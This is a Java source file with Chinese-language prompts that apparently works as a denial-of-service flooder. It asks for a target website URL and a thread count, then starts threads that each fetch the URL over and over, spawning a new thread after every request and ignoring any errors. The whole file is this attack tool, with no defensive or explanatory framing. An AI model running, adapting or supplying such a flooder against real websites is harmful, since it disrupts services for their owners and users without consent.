import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;

public class Main {

    public static void main(String[] a){
        System.out.println("请输入网站地址 注意http字样需要提交进去");
        Scanner ipr = new Scanner(System.in);
        String ip = ipr.nextLine();
        System.out.println("即将进行操作的IP是:" + ip);
        try {
            URL url = new URL(ip);
            System.out.println("请输入线程数");
            Scanner xcr = new Scanner(System.in);
            String xc = xcr.nextLine();
            Go(xc,url);
            System.out.println("已开始");
        } catch (MalformedURLException e) {
            System.out.println("ip问题,请在浏览器打开该网站,然后从浏览器复制输入");
            for (int x = 0 ;x<2;x++) System.out.println("\n");
            main(null);
        }
    }
    private static void Go(String xc,URL url){
        for(int x = 0 ; x< Integer.parseInt(xc) ; x++){
            run(url);
        }
    }
    private static void run(URL url){
        new Thread(() -> {
            try {
                url.openStream();
                run(url);

            } catch (IOException e) {
            }

        }).start();
    }

}
